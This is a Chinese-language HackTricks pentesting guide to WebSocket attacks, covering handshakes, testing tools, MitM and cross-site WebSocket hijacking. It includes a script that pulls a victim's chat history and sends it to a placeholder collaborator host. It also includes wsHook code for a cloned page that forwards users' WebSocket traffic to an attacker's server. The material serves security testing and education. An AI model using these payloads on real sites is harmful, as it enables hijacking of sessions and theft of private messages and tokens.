# WebSocket 攻击

{% hint style="success" %}
学习与实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks 培训 AWS 红队专家 (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
学习与实践 GCP 黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks 培训 GCP 红队专家 (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>支持 HackTricks</summary>

* 查看 [**订阅计划**](https://github.com/sponsors/carlospolop)!
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram 群组**](https://t.me/peass) 或 **关注** 我们的 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub 仓库提交 PR 分享黑客技巧。

</details>
{% endhint %}

## 什么是 WebSockets

WebSocket 连接通过初始的 **HTTP** 握手建立，旨在实现 **长时间** 连接，允许随时进行双向消息传递，而无需事务系统。这使得 WebSockets 特别适合需要 **低延迟或服务器发起通信** 的应用程序，例如实时金融数据流。

### WebSocket 连接的建立

有关建立 WebSocket 连接的详细说明可以访问 [**这里**](https://infosecwriteups.com/cross-site-websocket-hijacking-cswsh-ce2a6b0747fc)。总之，WebSocket 连接通常通过客户端 JavaScript 发起，如下所示：
```javascript
var ws = new WebSocket("wss://normal-website.com/ws");
```
`wss` 协议表示一个通过 **TLS** 安全的 WebSocket 连接，而 `ws` 表示一个 **不安全** 的连接。

在连接建立期间，浏览器和服务器之间通过 HTTP 进行握手。握手过程涉及浏览器发送请求和服务器响应，如下例所示：

浏览器发送握手请求：
```javascript
GET /chat HTTP/1.1
Host: normal-website.com
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: wDqumtseNBJdhkihL6PW7w==
Connection: keep-alive, Upgrade
Cookie: session=KOsEJNuflw4Rd9BDNrVmvwBF9rEijeE2
Upgrade: websocket
```
服务器的握手响应：
```javascript
HTTP/1.1 101 Switching Protocols
Connection: Upgrade
Upgrade: websocket
Sec-WebSocket-Accept: 0FFP+2nmNIf/h+4BP36k9uzrYGk=
```
一旦建立，连接将保持开放以便双向消息交换。

**WebSocket 握手的关键点：**

- `Connection` 和 `Upgrade` 头部信号表示 WebSocket 握手的开始。
- `Sec-WebSocket-Version` 头部指示所需的 WebSocket 协议版本，通常为 `13`。
- 在 `Sec-WebSocket-Key` 头部中发送一个 Base64 编码的随机值，确保每个握手都是唯一的，这有助于防止缓存代理出现问题。这个值不是用于身份验证，而是确认响应不是由配置错误的服务器或缓存生成的。
- 服务器响应中的 `Sec-WebSocket-Accept` 头部是 `Sec-WebSocket-Key` 的哈希，验证服务器打开 WebSocket 连接的意图。

这些特性确保握手过程安全可靠，为高效的实时通信铺平道路。

### Linux 控制台

您可以使用 `websocat` 与 websocket 建立原始连接。
```bash
websocat --insecure wss://10.10.10.10:8000 -v
```
或者创建一个 websocat 服务器：
```bash
websocat -s 0.0.0.0:8000 #Listen in port 8000
```
### MitM websocket 连接

如果你发现客户端从当前本地网络连接到一个 **HTTP websocket**，你可以尝试进行一个 [ARP Spoofing Attack ](../generic-methodologies-and-resources/pentesting-network/#arp-spoofing)来在客户端和服务器之间执行 MitM 攻击。\
一旦客户端尝试连接，你可以使用：
```bash
websocat -E --insecure --text ws-listen:0.0.0.0:8000 wss://10.10.10.10:8000 -v
```
### Websockets enumeration

您可以使用 **工具** [**https://github.com/PalindromeLabs/STEWS**](https://github.com/PalindromeLabs/STEWS) **自动发现、指纹识别和搜索已知的** **漏洞** **在 websockets 中。**

### Websocket Debug tools

* **Burp Suite** 以与常规 HTTP 通信非常相似的方式支持 MitM websockets 通信。
* [**socketsleuth**](https://github.com/snyk/socketsleuth) **Burp Suite 扩展** 将允许您通过获取 **历史记录**、设置 **拦截规则**、使用 **匹配和替换** 规则、使用 **Intruder** 和 **AutoRepeater** 更好地管理 Burp 中的 Websocket 通信。
* [**WSSiP**](https://github.com/nccgroup/wssip)**:** 代表 "**WebSocket/Socket.io Proxy**"，这个用 Node.js 编写的工具提供了一个用户界面来 **捕获、拦截、发送自定义** 消息并查看客户端和服务器之间的所有 WebSocket 和 Socket.IO 通信。
* [**wsrepl**](https://github.com/doyensec/wsrepl) 是一个 **交互式 websocket REPL**，专门为渗透测试设计。它提供了一个接口来观察 **传入的 websocket 消息并发送新的消息**，并提供一个易于使用的框架来 **自动化** 这种通信。&#x20;
* [**https://websocketking.com/**](https://websocketking.com/) 是一个 **用于与其他网站通信** 的 **web**，使用 **websockets**。
* [**https://hoppscotch.io/realtime/websocket**](https://hoppscotch.io/realtime/websocket) 在其他类型的通信/协议中，它提供了一个 **用于与其他网站通信** 的 **web**，使用 **websockets**。

## Websocket Lab

在 [**Burp-Suite-Extender-Montoya-Course**](https://github.com/federicodotta/Burp-Suite-Extender-Montoya-Course) 中，您有一个代码来启动一个使用 websockets 的 web，在 [**这篇文章**](https://security.humanativaspa.it/extending-burp-suite-for-fun-and-profit-the-montoya-way-part-3/) 中您可以找到解释。

## Cross-site WebSocket hijacking (CSWSH)

**跨站点 WebSocket 劫持**，也称为 **跨源 WebSocket 劫持**，被识别为影响 WebSocket 握手的 **[跨站请求伪造 (CSRF)](csrf-cross-site-request-forgery.md)** 的特定案例。此漏洞发生在 WebSocket 握手仅通过 **HTTP cookies** 进行身份验证，而没有 **CSRF tokens** 或类似的安全措施。

攻击者可以通过托管一个 **恶意网页** 来利用这一点，该网页发起对易受攻击应用程序的跨站点 WebSocket 连接。因此，这个连接被视为受害者与应用程序的会话的一部分，利用会话处理机制中缺乏 CSRF 保护。

### Simple Attack

请注意，当 **建立** 一个 **websocket** 连接时，**cookie** 会被 **发送** 到服务器。**服务器** 可能会使用它来 **关联** 每个 **特定** **用户** 与其 **基于发送的 cookie 的 websocket** **会话**。

然后，如果 **例如** **websocket** **服务器** **发送回用户的对话历史**，如果发送了一个消息 "**READY"**，那么一个 **简单的 XSS** 建立连接（**cookie** 将 **自动发送** 以授权受害者用户） **发送** "**READY**" 将能够 **检索** **对话** 的历史记录。
```markup
<script>
websocket = new WebSocket('wss://your-websocket-URL')
websocket.onopen = start
websocket.onmessage = handleReply
function start(event) {
websocket.send("READY"); //Send the message to retreive confidential information
}
function handleReply(event) {
//Exfiltrate the confidential information to attackers server
fetch('https://your-collaborator-domain/?'+event.data, {mode: 'no-cors'})
}
</script>
```
### 跨源 + 不同子域的 Cookie

在这篇博客文章 [https://snyk.io/blog/gitpod-remote-code-execution-vulnerability-websockets/](https://snyk.io/blog/gitpod-remote-code-execution-vulnerability-websockets/) 中，攻击者成功地 **在发生 Websocket 通信的域的子域中执行任意 Javascript**。因为这是一个 **子域**，**cookie** 被 **发送**，而且 **Websocket 没有正确检查 Origin**，因此可以与其通信并 **窃取其中的令牌**。

### 从用户那里窃取数据

复制您想要模仿的 Web 应用程序（例如 .html 文件），并在发生 Websocket 通信的脚本中添加以下代码：
```javascript
//This is the script tag to load the websocket hooker
<script src='wsHook.js'></script>

//These are the functions that are gonig to be executed before a message
//is sent by the client or received from the server
//These code must be between some <script> tags or inside a .js file
wsHook.before = function(data, url) {
var xhttp = new XMLHttpRequest();
xhttp.open("GET", "client_msg?m="+data, true);
xhttp.send();
}
wsHook.after = function(messageEvent, url, wsObject) {
var xhttp = new XMLHttpRequest();
xhttp.open("GET", "server_msg?m="+messageEvent.data, true);
xhttp.send();
return messageEvent;
}
```
现在从 [https://github.com/skepticfx/wshook](https://github.com/skepticfx/wshook) 下载 `wsHook.js` 文件，并**将其保存在网页文件夹内**。\
通过暴露网络应用程序并使用户连接到它，您将能够窃取通过 websocket 发送和接收的消息：
```javascript
sudo python3 -m http.server 80
```
## 竞争条件

WebSockets中的竞争条件也是一个问题，[查看此信息以了解更多](race-condition.md#rc-in-websockets)。

## 其他漏洞

由于Web Sockets是一种**向服务器端和客户端发送数据的机制**，因此根据服务器和客户端如何处理信息，**Web Sockets可以被用来利用其他几种漏洞，如XSS、SQLi或任何其他常见的网络漏洞，使用来自websocket的用户输入。**

## **WebSocket走私**

此漏洞可能允许您**绕过反向代理限制**，使其相信**已建立了websocket通信**（即使这不是真的）。这可能允许攻击者**访问隐藏的端点**。有关更多信息，请查看以下页面：

{% content-ref url="h2c-smuggling.md" %}
[h2c-smuggling.md](h2c-smuggling.md)
{% endcontent-ref %}

## 参考文献

* [https://portswigger.net/web-security/websockets#intercepting-and-modifying-websocket-messages](https://portswigger.net/web-security/websockets#intercepting-and-modifying-websocket-messages)

{% hint style="success" %}
学习和实践AWS黑客攻击：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks培训AWS红队专家（ARTE）**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
学习和实践GCP黑客攻击：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks培训GCP红队专家（GRTE）**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>支持HackTricks</summary>

* 查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)或**在Twitter上关注**我们🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github库提交PR来分享黑客技巧。

</details>
{% endhint %}
